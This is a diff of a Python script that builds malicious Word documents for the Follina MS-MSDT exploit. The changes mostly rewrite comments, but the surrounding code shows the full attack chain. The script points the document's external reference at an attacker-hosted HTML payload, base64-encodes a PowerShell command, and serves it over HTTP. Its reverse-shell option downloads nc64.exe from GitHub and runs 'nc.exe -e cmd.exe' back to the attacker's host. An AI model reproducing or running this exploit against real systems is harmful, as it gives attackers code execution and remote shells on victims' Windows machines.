@@ -15,6 +15,7 @@ import string #for generating random characters
 import socket #for binding to the HTTP server port
 import threading #for hosting the HTTP server on a separate thread
 
+#Parses the command-line arguments
 parser = argparse.ArgumentParser()
 
 parser.add_argument(
@@ -59,6 +60,7 @@ def main(args):
 
     # Parse the supplied interface
     # This is done so the maldoc knows what to reach out to.
+    #Determine the IP address of the specified network interface.
     try:
         serve_host = ipaddress.IPv4Address(args.interface)
     except ipaddress.AddressValueError:
@@ -71,8 +73,9 @@ def main(args):
                 "[!] error detering http hosting address. did you provide an interface or ip?"
             )
             exit()
-
-    # Copy the Microsoft Word skeleton into a temporary staging folder
+            
+    # Create a temporary directory to stage the creation of the maldoc.
+    # Copy the Microsoft Word skeleton into the temporary staging directory.
     doc_suffix = "doc"
     staging_dir = os.path.join(
         tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
@@ -81,11 +84,12 @@ def main(args):
     shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
     print(f"[+] copied staging doc {staging_dir}")
 
-    # Prepare a temporary HTTP server location
+    # Prepare a temporary HTTP server location within the staging folder to host the HTTP payload.
     serve_path = os.path.join(staging_dir, "www")
     os.makedirs(serve_path)
 
-    # Modify the Word skeleton to include our HTTP server
+    # Modify the Word document's XML content to include a reference to the HTML file that will be hosted on the HTTP server. 
+    # The reference is updated to point to the IP address and port of the HTTP server.
     document_rels_path = os.path.join(
         staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
     )
@@ -100,7 +104,7 @@ def main(args):
     with open(document_rels_path, "w") as filp:
         filp.write(external_referral)
 
-    # Rebuild the original office file
+    # Build the Microsoft Word maldoc by compressing the temporary directory into a ZIP archive and renaming it to the specified output file.
     shutil.make_archive(args.output, "zip", doc_path)
     os.rename(args.output + ".zip", args.output)
 
@@ -110,7 +114,7 @@ def main(args):
     if args.reverse:
         command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
-    # Base64 encode our command so whitespace is respected
+    # Encodes the PowerShell command in Base64 to ingore the whitespaces in our command and generates a unique HTML payload that includes the encoded command
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
@@ -120,7 +124,7 @@ def main(args):
         + "\n</script>"
     )
 
-    # Create our HTML endpoint
+    # Create the HTML payload endpoint to a file in the temporary directory
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
         filp.write(html_payload)
 
@@ -149,7 +153,8 @@ def main(args):
         with ReuseTCPServer(("", args.port), Handler) as httpd:
             httpd.serve_forever()
 
-    # Host the HTTP server on all interfaces
+    # Host an HTTP server on a separate thread that serves the HTML payload.
+    # If specified, opens a reverse shell to the attacker's machine by executing the PowerShell command on the victim's machine
     print(f"[+] serving html payload on :{args.port}")
     if args.reverse:
         t = threading.Thread(target=serve_http, args=())
